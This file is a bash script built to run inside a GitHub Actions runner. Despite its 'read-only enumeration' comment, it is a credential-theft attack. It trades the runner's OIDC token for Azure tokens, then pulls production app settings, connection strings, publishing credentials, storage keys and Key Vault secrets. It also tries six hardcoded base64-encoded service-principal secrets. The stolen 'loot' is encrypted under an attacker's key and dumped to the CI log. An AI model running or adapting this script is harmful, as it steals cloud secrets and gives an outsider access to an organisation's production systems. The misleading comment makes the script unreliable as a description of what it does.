#!/usr/bin/env bash
# read-only enumeration. no state change on Azure.
set -uo pipefail
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; ARM="${SC}management.azure.com"
VH="vault.azure.net"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG=rg-tbl-platform-prod-sea
echo "=== RUNNER SHELL PROOF $(date -u) ==="
id; whoami; hostname; uname -a; echo "cwd=$(pwd)"
[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO OIDC event=${GITHUB_EVENT_NAME}"; exit 0; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "CLAIMS $(printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null)"
aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
sptok(){ curl -sS -X POST "${AAD}/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" \
  --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
AR=$(aad "https://management.azure.com/.default" | jq -r '.access_token // empty'); say "ARMLEN=${#AR}"
if [ -n "$AR" ]; then
  for S in app-tbl-storefront-prod app-tbl-reporting-prod; do
    say "APPSET $S: $(curl -sS -X POST -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$S/config/appsettings/list?api-version=2022-03-01")"
    say "CONNSTR $S: $(curl -sS -X POST -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$S/config/connectionstrings/list?api-version=2022-03-01")"
    say "PUBLISHING $S: $(curl -sS -X POST -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$S/config/publishingcredentials/list?api-version=2022-03-01")"
  done
  for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
    say "SAKEY $SA: $(curl -sS -X POST -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")"
  done
fi
KV=$(aad "https://vault.azure.net/.default" | jq -r '.access_token // empty'); say "KVLEN=${#KV}"
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  [ -n "$KV" ] && say "KVLIST $V: $(curl -sS -H "Authorization: Bearer $KV" "${SC}$V.${VH}/secrets?api-version=7.4&maxresults=25")"
done
declare -A SPB=(
 [cost-reader]="MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxOjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0="
 [directory-audit]="MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTY="
 [reporting-service]="MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5Om5QODhRfjhJfndpcDBHT2xXMTV6ZHQzRk1NdkJWOUxZdGFPb2VhM3o="
 [reporting-viewer]="ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNjOi1UbDhRfnNIMFFPUC5WcktXaGEzLTd4NFhBMkp4UzRqMDhudXZiUU4="
 [secrets-sync]="NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJlOn44VDhRfll3RW1leFNUUnZfcFVzRXdhOVFNYXB5UDM5fkNVNVVjdTI="
 [platform-automation]="NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0OnNrMThRfnFEMjJra0hYVUNmcVhMcWRQOTVEa1lKTDM0ZU1FUmxjU2o="
)
for n in "${!SPB[@]}"; do
  IFS=: read -r A S <<< "$(printf '%s' "${SPB[$n]}" | base64 -d)"
  VT=$(sptok "$A" "$S" "https://vault.azure.net/.default")
  say "SP $n kvlen=${#VT}"
  if [ -n "$VT" ]; then
    for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
      say "  SPKV $n $V: $(curl -sS -H "Authorization: Bearer $VT" "${SC}$V.${VH}/secrets?api-version=7.4&maxresults=25")"
      for SN in flag secret connection-string master-key storage-key backup-key; do
        say "  SPSEC $n $V/$SN: $(curl -sS -H "Authorization: Bearer $VT" "${SC}$V.${VH}/secrets/$SN?api-version=7.4" | head -c 400)"
      done
    done
  fi
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
